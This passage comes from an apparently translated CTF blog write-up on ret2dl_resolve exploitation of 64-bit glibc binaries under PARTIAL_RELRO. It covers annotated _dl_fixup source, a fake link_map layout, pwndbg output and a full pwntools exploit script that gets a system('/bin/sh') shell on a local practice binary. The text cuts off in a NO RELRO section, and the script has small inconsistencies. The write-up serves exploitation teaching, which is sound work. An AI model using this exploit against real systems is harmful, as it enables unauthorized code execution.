l_</span><br></pre></td></tr></table></figure><p>I read it directly in pwndbg here, because of the structure of the source code, I have seen too little woo woo l_info This place contains<strong>DT_SYMTAB</strong>  <strong>DT_STRTAB</strong>  <strong>DT_JMPREL</strong>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  Get the DT_SYMTAB table of the linkmap</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);   Get the DT_JMPREL table of linkmap reloc relocation structure</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  Get r_info in the relocation structure</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   r_info为<span class="number">7</span>即可绕过</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) sym-&gt;st_other is not <span class="number">0.</span> In fact, this place can fill in a parsed got table. When the writegot table is retrieved, it will be \x7f,. The statement in this <span class="keyword">if</span> is not what we want to play in <span class="number">64</span> bits. These conditions jump directly to the <span class="keyword">else</span> branch</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> r_found_version *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);   It is found here that as <span class="type">long</span> as you control l-&gt;l_addr and sym-&gt;st_value, you can directly move here, sym-&gt;st_value is written as the function address of one of our libc, and l-&gt;l_addr is covered with a function address that we want to hijack. system-write, why write write here, because the sym-&gt;st_value we hijacked before is the address of the hijacked write function in libc, and it should also be written as libc address here</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">c</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">elf_machine_fixup_plt</span> <span class="params">(l, result, reloc, rel_addr, value)</span>;</span><br><span class="line">&#125;rel_addr就是l-&gt;addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_machine_fixup_plt：</span><br><span class="line">elf_machine_fixup_plt (<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span><br><span class="line">       <span class="type">const</span> Elf32_Rela *reloc,</span><br><span class="line">       Elf32_Addr *reloc_addr, Elf32_Addr value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;  We can see that the value overwrites reloc_addr and binds the value of the function. Next, directly when binding jmp r11</span><br><span class="line">&#125;</span><br><span class="line">Automatically bind and jmp r11 to system :</span><br><span class="line">──────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0xee</span></span><br><span class="line"> RBX  <span class="number">0x7ffff85dd3b0</span> —▸ <span class="number">0x400740</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line">*RCX  <span class="number">0x7f8395536fd2</span> (read+<span class="number">18</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line"> RDX  <span class="number">0x100</span></span><br><span class="line"> RDI  <span class="number">0x601198</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x7f8395643d60</span> (_dl_fini) ◂— endbr64 </span><br><span class="line"> R10  <span class="number">0x601150</span> ◂— <span class="number">0xfffffffffff44230</span></span><br><span class="line"> R11  <span class="number">0x7f839547b290</span> (system) ◂— endbr64 </span><br><span class="line"> R12  <span class="number">0x400550</span> (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7ffff85dd4c0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"> RSP  <span class="number">0x7ffff85dd000</span> ◂— <span class="number">0x100</span></span><br><span class="line">*RIP  <span class="number">0x7f839564ac6b</span> (_dl_runtime_resolve_xsavec+<span class="number">171</span>) ◂— mov    rax, qword ptr [rsp]</span><br><span class="line">────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x7f839564ac52</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">146</span>&gt;    mov    r8, qword ptr [rsp + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f839564ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x7f839564ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7f839564ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7f839564ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line"> ► <span class="number">0x7f839564ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">   <span class="number">0x7f839564ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">   <span class="number">0x7f839564ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">   <span class="number">0x7f839564ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>DT_STRTAB pointer: located in link_map_addr +0x68 (0x34 under 32 bits)</li><li>DT_SYMTAB pointer: located at link_map_addr + 0x70 (0x38 under 32 bits)</li><li>DT_JMPREL pointer: located in link_map_addr +0xF8 (0x7C under 32 bits)</li></ul><p>Another thing to mention is l-&gt;addr, this fill in, this fill must be positive, if it is negative, it will report an error, so here we calculate the offset, if it is a positive sign, we will write it as a positive sign. The master conversion is &amp; (2 ** 64 - 1), we roughly analyze the source code and we know the principle, the following is the construction of the linkmap board</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>-- l_addr offset must be guaranteed to be positive here</span><br><span class="line"><span class="number">2</span>-- DT_JMPREL: make its address point to the location of the constructed .rel.plt relocation table entry</span><br><span class="line"><span class="number">3</span>-- Relocation table entry.rel.plt: make r_info, that is, the index redirected to the symbol table, is <span class="number">0</span></span><br><span class="line"><span class="number">4</span>-- DT_SYMTAB: Make the address pointing to the symbol table write_got<span class="number">-0x8</span>, so that st_value is equal to write_gotc</span><br><span class="line"><span class="number">5</span>-- DT_STRTAB: not used, just point to a readable location</span><br><span class="line">After constructing from the above steps, you can get value = l_addr + write_got = real_system, write the value into the got table entry and successfully call the system function</span><br></pre></td></tr></table></figure><p>Since the linkmap is not much different, the board of the online blog is directly used (if there is any infringement, please inform),</p><p>linkmap board:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPREL，Its structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure><p>Let’s play a stack overflow question directly. The use conditions are harsh, only overflow, and basically nothing else. At this time, we have to consider the ret2dl method.</p><p>The basic steps of stack overflow problem (PARTIAL_RELRO)</p><p>If there is an overflow in the first step, we migrate to a bss place, which is writable (executable), and then jump to the <em>dl_runtime_resolve</em> place, which is on our ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400540</span> _read           proc near               ; CODE XREF: vuln+<span class="number">2F</span>↓p</span><br><span class="line">.plt:<span class="number">0000000000400540</span>                 jmp     cs:off_601030</span><br><span class="line">.plt:<span class="number">0000000000400540</span> _read           endp</span><br><span class="line">.plt:<span class="number">0000000000400540</span></span><br><span class="line">.plt:<span class="number">0000000000400546</span> ; ---------------------------------------------------------------------------c</span><br><span class="line">.plt:<span class="number">0000000000400546</span>                 push    <span class="number">3</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span>                 jmp     sub_400500   this place</span><br><span class="line">.plt:<span class="number">000000000040054B</span> ; &#125; <span class="comment">// starts at 400500</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span> _plt</span><br></pre></td></tr></table></figure><p>This involves the binding knowledge of a lazy binding</p><p>To directly adopt the words of Master Kotor’s master is:</p><p>When the library function is called for the first time, the program will first go to his plt table, push the second parameter <code>reloc_offset</code> of <code>_dl_runtime_resolve</code>, at this time the got table stores the next jump from his own plt table A statement, jump to the public plt[0], push the first parameter <code>link_map</code>, and finally call <code>_dl_runtime_resolve</code> to write the redirected address into the got table</p><p><img src="https://img.le1a.com/2022/04/21/8cc3d5dd226a8.png" alt="1650544684766.png"></p><p>This 0x8049030 is where we _dl_runtime_resolve (secretly took the picture of kot master, (escape)), then that’s ok, know this location, directly hijack the execution flow to this place when we finally return, and then hijack it again , we fill in a linkmap address we forged later, one is reloc_arg, here we are hijacking the linkmap, but we don’t need it, so it can be 0, and the construction can be started directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#bss  </span></span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_addr = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># l_addr = -769472, 通常为负数</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span>  </span><br><span class="line"><span class="comment">#用于解析符号dl_runtime_resolve  </span></span><br><span class="line">dl_re = <span class="number">0x400506</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPREL，Its structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_addr, write_got ,l_addr)<span class="comment"># 伪造link_map</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)\+p64(pop_rdi)+p64(bss_addr+<span class="number">0x48</span>)+p64(dl_re)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&#x27;dir /home/roo/Desktop/ret2dl/glibc-2.31/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line">raw_input()</span><br><span class="line">r.send(fake_link_map) </span><br><span class="line"></span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure><p>The above is just a brief introduction to the ret2dl of the program under PARTIAL_RELRO 64-bit. Of course, under 64-bit NO RELRO, the structure becomes very simple. Let’s briefly introduce it.</p><p>NO RELRO</p><p>This is a direct fake dynstr that is DT_STRTAB</p><table><thead><tr><th>name</th><th>section name</th></tr></thead><tbody><tr><td>DT_STRTAB</td><td>.dynstr</td></tr><tr><td>DT_SYMTAB</td><td>.dynsym</td></tr><tr><td>DT_JMPREL</td><td>.rel.plt</td></tr></tbody></table><p>see from ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400398</span> byte_400398     db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">00000000004002</span>D8↑o</span><br><span class="line">LOAD:<span class="number">0000000000400398</span>                                         ; LOAD:<span class="number">00000000004002F</span>0↑o ...</span><br><span class="line">LOAD:<span class="number">0000000000400399</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0000000000400408</span>↓o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A3 aStdin          db <span class="string">&#x27;stdin&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span 